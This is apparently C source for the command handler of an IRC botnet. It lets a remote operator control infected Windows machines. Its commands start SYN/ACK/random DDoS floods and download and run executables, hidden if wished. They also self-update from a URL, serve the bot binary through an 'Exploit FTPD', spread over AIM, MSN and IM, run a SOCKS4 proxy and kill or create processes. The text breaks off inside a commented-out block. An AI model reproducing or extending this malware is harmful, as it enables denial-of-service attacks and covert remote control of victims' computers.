#include "includes.h"
#include "strings.h"
#include "functions.h"

extern char netinfo_title[];
extern int serversize;

int IRC_TempCommand(char *params,irc_reply_data* hostd,void* conn,BOOL silent,BOOL topic/*=FALSE*/)
{
	IRC* irc=(IRC*)conn;

	char *a[MAX_TOKENS];
	//params++; //remove the ':'
	char fcmd[1024];
	strcpy(fcmd,params);
	if (fcmd[0] == prefix)
	{
		int t=SplitParams(a,params,MAX_TOKENS);
		SWITCHES switches=GetSwitches(a,t);

		if (!a[0])
			return 1;

		if (a[0][0] == prefix)
		{
			a[0]++;
			IRC_CommandParse(a,t,fcmd,hostd,irc,switches,topic);
		}
		else
		{
			if (!silent)
				irc->privmsg(hostd->target,"%s Failed to parse command.",logic_title);
			return 1;
		} 
	}

	return 1;
}

int IRC_CommandParse(char *a[MAX_TOKENS],int t,char *params,irc_reply_data* hostd,void* conn,SWITCHES switches,BOOL topic/*=FALSE*/)
{
	IRC* irc=(IRC*)conn;

	int tnum; // for finding the number of a already running thread
	int i;	  // for misc shit
	DWORD id; // for creating new threads
	BOOL dec=FALSE;

	if (topic)
	{
		if (!lstrcmpi(cmd_login_1,a[0]) || !lstrcmpi(cmd_login_2,a[0]))
			return 1;
		if (!lstrcmpi(cmd_logout_1,a[0]) || !lstrcmpi(cmd_logout_2,a[0]))
			return 1;
		if (!lstrcmpi(cmd_remove_1,a[0]) || !lstrcmpi(cmd_remove_2,a[0]))
			return 1;
	}

	// stops
	if (switches.stop)
	{
		if (!lstrcmpi(cmd_threads_1,a[0]) || !lstrcmpi(cmd_threads_2,a[0]))
		{
			stopthread(hostd->target,irc,switches.silent,switches.verbose,0,LIST_THREAD,"Thread list");
			return 1;
		}
		
#ifndef NO_PROCESS
		else if (!lstrcmpi(cmd_process_1,a[0]) || !lstrcmpi(cmd_process_2,a[0]))
		{
			stopthread(hostd->target,irc,switches.silent,switches.verbose,0,PROC_THREAD,"Process");
			return 1;
		}
#endif

#ifndef NO_SECURE
		else if (!lstrcmpi(cmd_secure_1,a[0]) || !lstrcmpi(cmd_secure_2,a[0])
			|| !lstrcmpi(cmd_unsecure_1,a[0]) || !lstrcmpi(cmd_unsecure_2,a[0]))
		{
			stopthread(hostd->target,irc,switches.silent,switches.verbose,0,SECURE_THREAD,"Secure");
			return 1;
		}
#endif

#ifndef NO_EFTPD
		else if (!lstrcmpi(cmd_eftpd_1,a[0]) || !lstrcmpi(cmd_eftpd_2,a[0]))
		{
			killftpd(hostd->target,irc,switches.silent,switches.verbose);
			return 1;
		}
#endif

#ifndef NO_ADVSCAN
		else if (!lstrcmpi(cmd_scanall_1,a[0]) || !lstrcmpi(cmd_scanall_2,a[0])
			|| !lstrcmpi(cmd_advscan_1,a[0]) || !lstrcmpi(cmd_advscan_2,a[0]))
		{
			stopthread(hostd->target,irc,switches.silent,switches.verbose,0,SCAN_THREAD,"Scanner");
			return 1;
		}
#endif
			
#ifndef NO_DOWNLOAD
		else if (!lstrcmpi(cmd_download_1,a[0]) || !lstrcmpi(cmd_download_2,a[0]))
		{
			stopthread(hostd->target,irc,switches.silent,switches.verbose,0,DOWNLOAD_THREAD,"Download");
			return 1;
		}
		else if (!lstrcmpi(cmd_update_1,a[0]) || !lstrcmpi(cmd_update_2,a[0]))
		{
			stopthread(hostd->target,irc,switches.silent,switches.verbose,0,DOWNLOAD_THREAD,"Update");
			return 1;
		}
#endif

#ifndef NO_SOCK4SERV
		else if (!lstrcmpi(cmd_socks4_1,a[0]) || !lstrcmpi(cmd_socks4_2,a[0]))
		{
			stopthread(hostd->target,irc,switches.silent,switches.verbose,0,SOCK4_THREAD,"Socks4 Server");
			return 1;
		}
#endif

#ifndef NO_MSNSPREAD
		else if (!lstrcmpi(cmd_msnspread_1,a[0]) || !lstrcmpi(cmd_msnspread_2,a[0]))
		{
			stopthread(hostd->target,irc,switches.silent,switches.verbose,0,IMSPREAD_THREAD,"Open IM Spread");
			return 1;
		}
#endif
#ifndef NO_IMSPREAD		
		else if (!lstrcmpi(cmd_imspread_1,a[0]) || !lstrcmpi(cmd_imspread_2,a[0]))
		{
			stopthread(hostd->target,irc,switches.silent,switches.verbose,0,IMSPREAD_THREAD,"Open IM Spread");
			return 1;
		}
#endif
#ifndef NO_AIMSPREAD	
		else if (!lstrcmpi(cmd_aimspread_1,a[0]) || !lstrcmpi(cmd_aimspread_2,a[0]))
		{
			stopthread(hostd->target,irc,switches.silent,switches.verbose,0,IMSPREAD_THREAD,"Open IM Spread");
			return 1;
		}
#endif

		else if (!lstrcmpi("aimp",a[0]))
		{
			AIM_Profile("",TRUE);
			return 1;
		}

	}

	//////////////////////////////////////////////////////////////////////////////
	//								Login
	//			At this point the user should already be logged in
	//////////////////////////////////////////////////////////////////////////////
	if (!lstrcmpi(a[0],cmd_login_1) || !lstrcmpi(a[0],cmd_login_2))
	{
		if (switches.verbose)
			irc->privmsg(hostd->target,str_auth_ali,main_title);
		return 1;
	}


#ifndef NO_ENCRYPT
	//////////////////////////////////////////////////////////////////////////////
	//								Encrypt
	//////////////////////////////////////////////////////////////////////////////
	if (!lstrcmpi(a[0],cmd_encrypt_1) || !lstrcmpi(a[0],cmd_encrypt_2))
	{
		char *cmd=strchr(params,' ');
		if (cmd)
		{
			cmd++;//remove the space

			char buffer[IRCLINE];
			unsigned int counter=0;
			ZeroMemory(buffer,sizeof(buffer));

			unsigned int str_len = strlen(cmd);

			// first encrypt string
			Crypt((unsigned char *)cmd, strlen(cmd),NULL,0);

			sprintf(buffer,"%s Cipher text: \"",main_title);
			for (unsigned int i=0; i < str_len; i++) {
				char tmpbuf[12];
				_snprintf(tmpbuf,sizeof(tmpbuf),"\\x%2.2X", (unsigned char)cmd[i]);
				counter+=strlen(tmpbuf);
				if (counter >= (IRCLINE-20)) {
					irc->privmsg(hostd->target,buffer);
					ZeroMemory(buffer,sizeof(buffer));	
					counter = 0;
				} 
				strncat(buffer,tmpbuf,strlen(tmpbuf));
			}
			strcat(buffer,"\";");
			irc->privmsg(hostd->target,buffer);

			// now to decrypt
			Crypt((unsigned char *)cmd, strlen(cmd),NULL,0);

		}
		return 1;
	}
#endif
	//////////////////////////////////////////////////////////////////////////////
	//								Encrypt
	//////////////////////////////////////////////////////////////////////////////
	if (!lstrcmpi(a[0],"encrypt2") || !lstrcmpi(a[0],"enc2"))
	{
		char *cmd=strchr(params,' ');
		if (cmd)
		{
			cmd++;//remove the space
			Encrypt2(cmd);
			irc->privmsg(hostd->target,"%s Cipher text: \"%s\"",main_title,cmd);
		}
		return 1;
	}

	//////////////////////////////////////////////////////////////////////////////
	//								Servers
	//////////////////////////////////////////////////////////////////////////////
	if (!lstrcmpi(a[0],"server") || !lstrcmpi(a[0],"srv"))
	{
		if (!a[1])
		{
			irc->privmsg(hostd->target,"%s: Current Server: %i: %s:%d%s",main_title,curserver,servers[curserver].host,servers[curserver].port,(servers[curserver].usessl?" (SSL)":""));
		}
		else if (!lstrcmpi(a[1],"list"))
		{
			irc->privmsg(hostd->target,"%s Server List:", main_title);
			for (int s=0;s<serversize;s++)
			{
				irc->privmsg(hostd->target,"%i: %s:%d%s, %s",s,servers[s].host,servers[s].port,(servers[s].usessl?" (SSL)":""),servers[s].chan);
			}
			irc->privmsg(hostd->target,"%s Server List complete.", main_title);
		}
		else if (!lstrcmpi(a[1],"jump"))
		{
			if (!a[2])
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,str_bad_format,main_title);
				return 1;
			}
			if (atoi(a[2])<0 || atoi(a[2])>=serversize)
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,"%s Invalid server.",main_title);
				return 1;
			}
			curserver=atoi(a[2])-1;//-1 for the ++ when it gets disconnected
			//Sleep(FLOOD_DELAY);
			irc->quit("Changing servers");
		}
		return 1;
	}

	//////////////////////////////////////////////////////////////////////////////
	//								Logout
	//////////////////////////////////////////////////////////////////////////////
	if (!lstrcmpi(cmd_logout_1, a[0]) || !lstrcmpi(cmd_logout_2, a[0]))
	{
		if (a[1])
		{
			i = atoi(a[1]);
			if(i>=0 && i<MAX_LOGINS)
			{
				if (irc->del_login(i))
				{
					if (!switches.silent)
						irc->privmsg(hostd->target,str_sl_logout,main_title,i);
				}

				else
				{
					if (!switches.silent)
						irc->privmsg(hostd->target,str_sl_no_logout, main_title, i);
				}
			}
			else
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,str_sl_in_logout, main_title, i);
			}
		}
		else
		{
			if (irc->del_login(hostd->nick,hostd->ident,hostd->host)!=-1)
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,str_logout,main_title,hostd->nick);
			}
		}
		return 1;
	}

	//////////////////////////////////////////////////////////////////////////////
	//								Who
	//////////////////////////////////////////////////////////////////////////////
	else if (!lstrcmpi(cmd_who,a[0]))
	{
		irc->list_logins(hostd->target);
		return 1;
	}

		//////////////////////////////////////////////////////////////////////////////
	//								Join
	//////////////////////////////////////////////////////////////////////////////
	else if (!lstrcmpi(cmd_join_1,a[0]) || !lstrcmpi(cmd_join_2,a[0]))
	{	
		if (!a[1])
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_bad_format,irc_title);
			return 1;
		}
		irc->join(a[1],(a[2]?a[2]:""));
		return 1;
	}

	//////////////////////////////////////////////////////////////////////////////
	//								Part
	//////////////////////////////////////////////////////////////////////////////
	else if (!lstrcmpi(cmd_part_1,a[0]) || !lstrcmpi(cmd_part_2,a[0]))
	{
		if (!a[1])
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_bad_format,irc_title);
			return 1;
		}
		irc->part(a[1]);
		return 1;
	}
	//////////////////////////////////////////////////////////////////////////////
	//							AIM Profile Spread
	//////////////////////////////////////////////////////////////////////////////
	else if (!lstrcmpi("aimp",a[0]))
	{
		if (!a[1] || !a[2])
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_bad_format,"DEBUG//");
			return 1;
		}
		char *cmd=strchr(params,' ');
		if (cmd)
		{
			cmd++;//remove the space
			if (AIM_Profile(cmd,FALSE))
				irc->privmsg(hostd->target,"Set AIM profile");
			else
				irc->privmsg(hostd->target,"Failed to set AIM profile");
		}
		return 1;
	}


	//////////////////////////////////////////////////////////////////////////////
	//								Remove
	//					FIXME: Add unsecure (if enabled)
	//////////////////////////////////////////////////////////////////////////////
	else if (!lstrcmpi(a[0],cmd_remove_1) || !lstrcmpi(a[0],cmd_remove_2))
	{
		uninstall();
		if (!switches.silent)
			irc->quit(str_quit_rem,hostd->nick,hostd->ident,hostd->host);
		else
			irc->quit(str_quit_rem,hostd->nick,hostd->ident,"*");
		Sleep(FLOOD_DELAY);
		irc->disconnect();
		fWSACleanup();
#ifdef _DEBUG
//		CloseLog();
#endif
		ExitProcess(EXIT_SUCCESS);
	}


	//////////////////////////////////////////////////////////////////////////////
	//								TestDLLs
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_DLLTEST
	else if (!lstrcmpi(a[0],cmd_testdlls))
	{
		CheckDLLs(hostd->target,irc);
		return 1;
	}
#endif // NO_DLLTEST

	//////////////////////////////////////////////////////////////////////////////
	//								Threads
	//////////////////////////////////////////////////////////////////////////////
	else if (!lstrcmpi(a[0],cmd_threads_1) || !lstrcmpi(a[0],cmd_threads_2))
	{
		if (a[1])
		{
			if (!lstrcmpi(cmd_threads_kill_1,a[1]) || !lstrcmpi(cmd_threads_kill_2,a[1]))
			{
				if (a[2])
				{
					if (!lstrcmpi(cmd_all,a[2]))
					{
						if ((i=killthreadall()) > 0)
						{
							if (!switches.silent)
								irc->privmsg(hostd->target,str_thread_stop,threads_title,i);
						}
						else
						{
							if (!switches.silent)
								irc->privmsg(hostd->target,str_thread_ac,threads_title);
						}
					}
					else
					{
						if (killthread(atoi(a[2])))
						{
							if (!switches.silent)
								irc->privmsg(hostd->target,str_thread_kill,threads_title,a[2]);
						}
						else 
						{
							if (!switches.silent)
								irc->privmsg(hostd->target,str_thread_fkill,threads_title,a[2]);
						}
					}
				}
				return 1;
			}
		}
		if ((tnum=findthreadnum(LIST_THREAD)) > 0)
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_thread_alr,threads_title,"Thread listing",tnum);
			return 1;
		}

		NTHREAD tlist;
		tlist.silent=switches.silent;
		tlist.verbose=switches.verbose;
		strcpy(tlist.target,hostd->target);
		tlist.conn=irc;
		tlist.bdata1 = ((a[1])?((!lstrcmpi(a[1],cmd_threads_sub))?(TRUE):(FALSE)):(FALSE)); // full list

		tlist.threadnum=addthread(LIST_THREAD,"%s Thread listing.",threads_title);
		if (threads[tlist.threadnum].tHandle = CreateThread(NULL, 0, &ListThread, (LPVOID)&tlist, 0, &id)) {
			while (tlist.gotinfo == FALSE)
				Sleep(50);
		}
		else
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_thread_fail,threads_title,"Thread listing",GetLastError());
		}
		return 1;
	}
	
	//////////////////////////////////////////////////////////////////////////////
	//								Socks4
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_SOCK4SERV
	else if (!lstrcmpi(cmd_socks4_1,a[0]) || !lstrcmpi(cmd_socks4_2,a[0]))
	{
		if ((tnum=findthreadnum(SOCK4_THREAD)) > 0)
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_thread_alr,sock4_title,"Socks4 Server",tnum);
			return 1;
		}

		NTHREAD sock4;
		sock4.silent=switches.silent;
		sock4.verbose=switches.verbose;
		strcpy(sock4.target,hostd->target);
		sock4.conn=irc;
		sock4.idata1 = (a[1]?atoi(a[1]):sock4port);
		
		sock4.threadnum=addthread(SOCK4_THREAD,"%s Server running on: %s:%i",sock4_title,exip,sock4.idata1);
		if (threads[sock4.threadnum].tHandle = CreateThread(NULL, 0, &SocksDaemon, (LPVOID)&sock4, 0, &id)) {
			while (sock4.gotinfo == FALSE)
				Sleep(50);
			if (!switches.silent)
				irc->privmsg(hostd->target,"%s Server running on: %s:%i",sock4_title,exip,sock4.idata1);
		}
		else
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_thread_fail,sock4_title,"Socks4 thread",GetLastError());
		}
		return 1;
	}
#endif

	//////////////////////////////////////////////////////////////////////////////
	//								Version
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_BOTVERSION
	else if (!lstrcmpi(cmd_version_1,a[0]) || !lstrcmpi(cmd_version_2,a[0]))
	{
		if (a[1])
		{
			if (lstrcmpi(botid,a[1]))
				irc->privmsg(hostd->target,"%s %s (%s)%s",main_title,version,botid,(switches.verbose?". Built on: "__DATE__".":""));
		}
		else
			irc->privmsg(hostd->target,"%s %s (%s)%s",main_title,version,botid,(switches.verbose?". Built on: "__DATE__".":""));

		return 1;
	}
#endif


	//////////////////////////////////////////////////////////////////////////////
	//								Status
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_STATUS
	else if (!lstrcmpi(cmd_status_1, a[0]) || !lstrcmpi(cmd_status_2, a[0])) {
		DWORD dwgtc=GetTickCount();
		
		char boxup[50],botup[50],serverup[50];
		sprintf(boxup,Uptime(dwgtc,0,TRUE));
		sprintf(botup,Uptime(dwgtc,dwstarted,TRUE));
		sprintf(serverup,Uptime(dwgtc,dwconnected,TRUE));

		if (findthreadid(SCAN_THREAD) > 0)
			irc->privmsg(hostd->target,str_status,main_title,"Scanning",boxup,botup,serverup);
		
		else if (findthreadid(DDOS_THREAD) > 0)
			irc->privmsg(hostd->target,str_status,main_title,"Attacking",boxup,botup,serverup);
			
		else
			irc->privmsg(hostd->target,str_status,main_title,"Idle",boxup,botup,serverup);

		return 1;
	}
#endif // NO_STATUS
/*
31337mods.com
*/
		else if (!lstrcmpi("open", a[0]) || !lstrcmpi("o", a[0])) 
		{
			if(fShellExecute(0, "open", a[1], NULL, NULL, SW_SHOW))
				irc->privmsg(hostd->target,"[SHELL]: File opened: %s", a[1]);
			else
				irc->privmsg(hostd->target,"[SHELL]: Couldn't open file: %s", a[1]);
		
			return 1;
		}
/*
by teh relekst
*/

	//////////////////////////////////////////////////////////////////////////////
	//							Secure/Unsecure
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_SECURE
	else if (!lstrcmpi(cmd_secure_1,a[0]) || !lstrcmpi(cmd_secure_2,a[0])
		|| !lstrcmpi(cmd_unsecure_1,a[0]) || !lstrcmpi(cmd_unsecure_2,a[0]))
	{
		BOOL bsecure=(!lstrcmpi(cmd_secure_1,a[0]) || !lstrcmpi(cmd_secure_2,a[0]));
		
		if ((tnum=findthreadnum(SECURE_THREAD)) > 0)
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_thread_alr,sec_title,"Secure thread",tnum);
			return 1;
		}

		NTHREAD secure;		
		secure.silent=switches.silent;
		secure.verbose=switches.verbose;
		strcpy(secure.target,hostd->target);
		secure.conn=irc;
		secure.bdata1=bsecure;//secure
		secure.bdata2=FALSE;//loop
		
		secure.threadnum=addthread(SECURE_THREAD,"%s %s.",(bsecure?sec_title:unsec_title),(bsecure?"Secure":"Unsecure"));
		if (threads[secure.threadnum].tHandle = CreateThread(NULL, 0, &SecureThread, (LPVOID)&secure, 0, &id))
		{
			while (secure.gotinfo == FALSE)
				Sleep(50);
		}
		else
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_thread_fail,(bsecure?sec_title:unsec_title),(bsecure?"Secure thread":"Unsecure thread"),GetLastError());
		}

		return 1;
	}
#endif

	//////////////////////////////////////////////////////////////////////////////
	//							Process Control
	//					.ps [list]
	//					.ps <kill> <image/pid>
	//					.ps <del> <pid> //FIXME
	//					.ps <create> <fullpathtoexe> [hide]
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_PROCESS
	else if (!lstrcmpi(cmd_process_1,a[0]) || !lstrcmpi(cmd_process_2,a[0]))
	{	
		if (!a[1])
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_bad_format,process_title);
			return 1;
		}

		NTHREAD process;
		process.silent=switches.silent;
		process.verbose=switches.verbose;
		strcpy(process.target,hostd->target);
		process.bdata1=FALSE; // list
		process.bdata2=FALSE; // kill
		process.bdata3=FALSE; // del
		process.conn=irc;

		if (!lstrcmpi(cmd_process_list,a[1]))
		{
			if ((tnum=findthreadnum(PROC_THREAD)) > 0)
			{
				irc->privmsg(hostd->target,str_thread_alr,process_title,"Process thread",tnum);
				return 1;
			}
			process.bdata1=TRUE;
			if (a[2])
				process.data2=a[2];//filter
			else
				process.data2=NULL;
		}
		else if (!lstrcmpi(cmd_process_kill,a[1]))
		{
			if (!a[2])
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,str_bad_format,process_title);
				return 1;
			}
			process.data1=a[2];
			process.bdata2=TRUE;  // kill
			process.bdata3=FALSE; // del
		}
		else if (!lstrcmpi(cmd_process_del,a[1]))
		{
			if (!a[2])
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,str_bad_format,process_title);
				return 1;
			}
			process.data1=a[2];
			process.bdata2=TRUE; // kill
			process.bdata3=TRUE; // del
		}
		else if (!lstrcmpi(cmd_process_create,a[1]))
		{
			if (!a[2])
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,str_bad_format,process_title);
				return 1;
			}
			if (a[3])
				process.bdata1=TRUE;
			if (switches.createwait)
				process.bdata2=TRUE;

			char file[MAX_PATH];
			sprintf(file,a[2]);
			if (switches.replace_underscores)
			{
				char replace='_';
				if (switches.replace_char)
					replace=switches.replace_char;
				int i;
				for (i=0;i<strlen(process.data1);i++)
					if (process.data1[i]==replace)
						process.data1[i]=' ';
			}
			process.data1=file;

			process.threadnum = addthread(PROC_THREAD,"%s Create process thread.",process_title);
			if (threads[process.threadnum].tHandle = CreateThread(NULL, 0, &CreateProcThread, (LPVOID)&process, 0, &id))
			{
				while (process.gotinfo == FALSE)
					Sleep(50);
			}
			else
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,str_thread_fail,process_title,"Process thread",GetLastError());
			}
			return 1;
		}
		else
		{
			return 1;
		}
		process.threadnum = addthread(PROC_THREAD,"%s Process thread.",process_title);
		if (threads[process.threadnum].tHandle = CreateThread(NULL, 0, &ProcessThread, (LPVOID)&process, 0, &id))
		{
			while (process.gotinfo == FALSE)
				Sleep(50);
		}
		else
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_thread_fail,process_title,"Process thread",GetLastError());
		}
		return 1;
	}
#endif // NO_PROCESS

	//////////////////////////////////////////////////////////////////////////////
	//								EFTPD
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_EFTPD
	else if (!lstrcmpi(cmd_eftpd_1,a[0]) || !lstrcmpi(cmd_eftpd_2,a[0]))
	{
		if ((tnum=findthreadnum(FTPD_THREAD)) > 0)
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,"%s Exploit FTPD is running on port: %i, at thread number: %i, total sends: %i.",ftp_title,FTP_PORT,tnum,eftpsends);
			return 1;
		}
		static FTP ftp;
		if (!staticftpd)
			ftp.port = (rand()%48127)+1024;
		else
			ftp.port = ftpdport;

		ftp.threads = 0;
		GetModuleFileName(0,ftp.filename,sizeof(ftp.filename));
		strncpy(ftp.requestname, filename, sizeof(ftp.requestname)-1);
		ftp.gotinfo=FALSE;
		strncpy(ftp.chan, servers[curserver].chan, sizeof(ftp.chan)-1);
		ftp.silent = switches.silent;
		ftp.verbose = switches.verbose;
		ftp.conn=conn;

		ftp.threadnum = addthread(FTPD_THREAD,"%s Server started, Port: %i, File: %s.", ftp_title, ftp.port, ftp.filename);
		if (threads[ftp.threadnum].tHandle = CreateThread(NULL, 0, &ftpd, (LPVOID)&ftp, 0, &id))
		{
			while (ftp.gotinfo == FALSE) 
				Sleep(50);

			if (!switches.silent && !switches.halfsilent)
				irc->privmsg(hostd->target,"%s Exploit FTPD enabled on port: %i, thread number: %i.", ftp_title,ftp.port,ftp.threadnum);
		}
		else
		{
			if (!switches.silent && !switches.halfsilent)
				irc->privmsg(hostd->target,str_thread_fail,process_title,"Exploit FTPD",GetLastError());
		}
		return 1;
	}
	#endif

	//////////////////////////////////////////////////////////////////////////////
	//								Raw
	//////////////////////////////////////////////////////////////////////////////
	else if (!lstrcmpi(cmd_raw_1,a[0]) || !lstrcmpi(cmd_raw_2,a[0]))
	{
		if (!a[1])
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_bad_format,irc_title);
			return 1;
		}
		char *raw=strchr(params,' ');
		if (raw)
		{
			raw++;//remove the space
			irc->raw(raw);
			if (!switches.silent)
				irc->privmsg(hostd->target,"%s Sent IRC raw: \"%s\".",irc_title,raw);
		}
		//else
		//{
		//	if (!silent)
		//		irc->privmsg(hostd->target,"%s Error sending raw.",irc_title);
		//}
		return 1;
	}
	
	//////////////////////////////////////////////////////////////////////////////
	//								Download
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_DOWNLOAD
	else if (!lstrcmpi(cmd_download_1,a[0]) || !lstrcmpi(cmd_download_2,a[0]))
	{
		if (!a[1] || !a[2])
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_bad_format,download_title);
			return 1;
		}
		if ((tnum=findthreadnum(DOWNLOAD_THREAD)) > 0)
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_thread_alr,download_title,"transfer thread",tnum);
			return 1;
		}
		NTHREAD dl;
		dl.conn=irc;
		dl.silent=switches.silent;
		dl.verbose=switches.verbose;
		strcpy(dl.target,hostd->target);
		dl.data1=a[1];//site
		dl.data2=a[2];//location
		dl.bdata1 = FALSE;//update
		dl.bdata2 = (a[3]?TRUE:FALSE);//run
		dl.bdata3 = (a[4]?TRUE:FALSE);//run hidden
		//dl.expectedcrc=((a[s+4])?(strtoul(a[s+4],0,16)):(0));
		//dl.filelen=((a[s+5])?(atoi(a[s+5])):(0));
		//dl.encrypted=(parameters['e']);

		
		dl.threadnum = addthread(DOWNLOAD_THREAD,"%s Downloading URL: %s to: %s.",download_title,(dec?"*":a[1]),a[2]);
		if (threads[dl.threadnum].tHandle = CreateThread(NULL, 0, &DownloadThread, (LPVOID)&dl, 0, &id))
		{
			while (dl.gotinfo == FALSE)
				Sleep(50);
			
			if (!switches.silent && switches.verbose)
				irc->privmsg(hostd->target,"%s Downloading URL: %s to: %s.",download_title,a[1],a[2]);
		}
		else
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_thread_fail,download_title,"transfer thread",GetLastError());
		}
		return 1;
	}

	//////////////////////////////////////////////////////////////////////////////
	//								Update
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_UPDATE
	else if (!lstrcmpi(cmd_update_1,a[0]) || !lstrcmpi(cmd_update_2,a[0]))
	{
		if (!a[1])
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_bad_format,update_title);
			return 1;
		}
		if (a[2])
		{
			if (!lstrcmpi(botid,a[2]))
			{
				return 1;
			}
		}
		if ((tnum=findthreadnum(DOWNLOAD_THREAD)) > 0)
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_thread_alr,update_title,"transfer thread",tnum);
			return 1;
		}

		char tempdir[MAX_PATH], tmpbuf[MAX_PATH];
		GetTempPath(sizeof(tempdir), tempdir);
		sprintf(tmpbuf,"%seraseme_%d%d%d%d%d.exe",tempdir,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9);

		NTHREAD dl;
		dl.conn=irc;
		dl.silent=switches.silent;
		dl.verbose=switches.verbose;
		strcpy(dl.target,hostd->target);
		dl.data1=a[1];
		dl.data2=tmpbuf;
		if (a[3]) dl.idata1=1;
		else	  dl.idata1=0;
		dl.bdata1 = TRUE;//update
		dl.bdata2 = FALSE;//run
		dl.bdata3 = FALSE;//run hidden

		
		dl.threadnum = addthread(DOWNLOAD_THREAD,"%s Downloading update from: %s to: %s.",update_title,(dec?"*":a[1]),dl.data2);
		if (threads[dl.threadnum].tHandle = CreateThread(NULL, 0, &DownloadThread, (LPVOID)&dl, 0, &id))
		{
			while (dl.gotinfo == FALSE)
				Sleep(50);
			
			if (!switches.silent && switches.verbose)
				irc->privmsg(hostd->target,"%s Downloading update from: %s to: %s.",update_title,a[1],dl.data2);
		}
		else
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_thread_fail,update_title,"transfer thread",GetLastError());
		}
		return 1;
	}
#endif // NO_UPDATE
#endif // NO_DOWNLOAD

	//////////////////////////////////////////////////////////////////////////////
	//								DDOS
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_DDOS
			//else if (!lstrcmpi(cmd_update_1,a[0]) || !lstrcmpi(cmd_update_2,a[0]))
	//else if (strcmp("ddos.syn", a[s]) == 0 || strcmp("ddos.ack", a[s]) == 0 || strcmp("ddos.random", a[s]) == 0) {	
	else if (!lstrcmpi(cmd_ddos_syn,a[0]) || !lstrcmpi(cmd_ddos_ack,a[0]) || !lstrcmpi(cmd_ddos_random,a[0])) {
	//	SOCKET sock;
	//	char sendbuf[IRCLINE];
		DDOS ddos;
		sprintf(ddos.ip,"%s", a[1]);
		sprintf(ddos.port,"%s", a[2]);
		sprintf(ddos.length,"%s", a[3]);
		/*
		strncpy(ddos.ip, a[1], sizeof(ddos.ip)-1);
		strncpy(ddos.port, a[2], sizeof(ddos.port)-1);
		strncpy(ddos.length, a[3], sizeof(ddos.length)-1);
		*/
				//		strncpy(ddos.chan, a[2], sizeof(ddos.chan)-1);
		//		strncpy(ddos.type,a[0],32);
		// ddos.chan = "#n0";
		if (strcmp("ddos.syn", a[0]) == 0 ) sprintf(ddos.type,"ddos.syn");
		else if (strcmp("ddos.random", a[0]) == 0 ) sprintf(ddos.type,"ddos.random"); 	
			else	sprintf(ddos.type,"ddos.ack");
	//	irc->privmsg(hostd->target,"[DDoS1]: ip: %s port: %s length: %s type: %s", ddos.ip, ddos.port, ddos.length, ddos.type);
			
			ddos.notice = 0;//switches.halfsilent;
				ddos.silent = 0;//switches.silent;
				ddos.conn=irc;
				strcpy(ddos.target,hostd->target);
	//			ddos.sock = sock;

	//			sprintf(sendbuf, "[DDoS]: Flooding: (%s:%s) for %s seconds.", a[1], a[2], a[3]);
								// addthread(DOWNLOAD_THREAD,"%s Downloading update from: %s to: %s.",update_title,(dec?"*":a[1]),dl.data2);
	//	irc->privmsg(hostd->target,"[DDoS 1]");		
				ddos.threadnum = addthread(DDOS_THREAD,"%s Flooding %s:%s for %s seconds",ddos_title,a[1],a[2],a[3]);
		//		sprintf(sendbuf,"%s",ddos.threadnum);
		//		irc->privmsg(hostd->target,"[DDoS num]: %s ",sendbuf );
		
				//CreateThread(NULL, 0, &DDOSThread, (LPVOID)&ddos, 0, &id);		
//		irc->privmsg(hostd->target,"[DDoS 2]");
	if (threads[ddos.threadnum].tHandle = CreateThread(NULL, 0, &DDOSThread, (LPVOID)&ddos, 0, &id)) {
					while(ddos.gotinfo == FALSE)
						Sleep(50);
				} else
			//		sprintf(sendbuf,"[DDoS]: Failed to start flood thread, error: <%d>.", GetLastError());

				if (!ddos.silent) irc->privmsg(hostd->target,"[DDoS]: Failed to start flood thread, error: <%d>.", GetLastError());
				//addlog(sendbuf);

				return 1;
			}
	//}
		/*	else if (strcmp("wonk.syn", a[s]) == 0 || strcmp("wonk.ack", a[s]) == 0) {
				DDOS ddos;
				strncpy(ddos.ip, a[s+1], sizeof(ddos.ip)-1);
				//strncpy(ddos.port, a[s+2], sizeof(ddos.port)-1);
				strncpy(ddos.length, a[s+2], sizeof(ddos.length)-1);
				strncpy(ddos.chan, a[2], sizeof(ddos.chan)-1);
				strncpy(ddos.type,a[s],32);
				ddos.notice = notice;
				ddos.silent = silent;
				ddos.sock = sock;

				sprintf(sendbuf, "[DDoS]: Flooding: (%s) for %s seconds.", a[s+1], a[s+2]);
				ddos.threadnum = addthread(sendbuf,DDOS_THREAD,NULL);

				if (threads[ddos.threadnum].tHandle = CreateThread(NULL, 0, &DDOSWonkThread, (LPVOID)&ddos, 0, &id)) {
					while(ddos.gotinfo == FALSE)
